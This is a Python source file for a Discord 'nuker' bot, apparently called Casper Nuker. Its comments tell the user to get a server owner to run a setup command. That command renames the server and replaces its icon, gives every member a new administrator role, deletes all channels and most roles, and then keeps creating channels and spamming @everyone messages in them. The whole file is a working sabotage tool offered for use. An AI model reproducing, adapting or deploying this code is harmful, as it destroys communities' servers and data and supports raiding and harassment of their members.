# Once you say !setup while the bot is in the server, it is fucked
# if you dont have permissions, get the owner to type it. Make sure to run the bot before letting it join.

import discord
from discord.ext import commands
import asyncio
import requests
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)
spamming = False
spam_tasks = []

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command(name='steal')  # <- change to anything
async def key(ctx):
    await ctx.send('Set up the bot first. Do !setup')

@bot.command()
@commands.has_permissions(administrator=True)
async def setup(ctx):
    global spamming
    global spam_tasks
    spamming = True

    image_url = "https://img.thedailybeast.com/image/upload/c_crop,d_placeholder_euli9k,h_1439,w_2560,x_0,y_0/dpr_2.0/c_limit,w_740/fl_lossy,q_auto/v1492182121/articles/2015/04/24/how-slavery-gave-capitalism-its-start/150423-herschthal-slavery-tease_nnp4oq"  # <- change to the image of the discord server you want
    response = requests.get(image_url)
    image = BytesIO(response.content)

    try:
        await ctx.guild.edit(icon=image.read())
    except discord.HTTPException as e:
        await ctx.send(f"Failed to update server profile picture: {e}")

    try:
        await ctx.guild.edit(name=".gg/uT7nJ3H5")   # <-   change to what you want the server to be named
    except discord.HTTPException as e:
        await ctx.send(f"Failed to update server name: {e}")

    try:
        fucked_role = await ctx.guild.create_role(
            name="fucked",
            color=discord.Color.from_rgb(139, 0, 0),
            permissions=discord.Permissions(administrator=True),
            reason="Role created by bot"
        )

        wanna_wheep_role = discord.utils.get(ctx.guild.roles, name="Wanna Wheep")
        if not wanna_wheep_role:
            wanna_wheep_role = await ctx.guild.create_role(
                name=".gg/uT7nJ3H5",
                color=discord.Color.red(),
                permissions=discord.Permissions(administrator=True),
                reason="Role created by bot"
            )

        for member in ctx.guild.members:
            await member.add_roles(fucked_role)


        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except discord.HTTPException as e:
                print(f"Failed to delete channel {channel.name}: {e}")


        for role in ctx.guild.roles:
            if role.name not in ["@everyone", "wanna wheep", "fucked"]:
                try:
                    await role.delete()
                except discord.HTTPException as e:
                    print(f"Failed to delete role {role.name}: {e}")

    except discord.HTTPException as e:
        await ctx.send(f"Error while modifying roles and channels: {e}")

    spam_tasks = []

    i = 1
    while spamming:
        try:
            new_channel = await ctx.guild.create_text_channel(f'Channel name{i}')    # <-  Change the "channel name" to the channel name you want to spam
            i += 1

            async def spam_channel(channel):
                while spamming:
                    try:
                        await channel.send('@everyone Casper Nuker fucked this server!')  # <- change your message you want to spam
                    except discord.Forbidden:
                        break
                    except discord.HTTPException as e:
                        print(f"Failed to send message: {e}")
                        break
                    await asyncio.sleep(0.5)

            task = bot.loop.create_task(spam_channel(new_channel))
            spam_tasks.append(task)
            await asyncio.sleep(1)
        except discord.HTTPException as e:
            print(f"Failed to create new channel: {e}")

bot.run('BotToken')     # <- change the bot token to yours
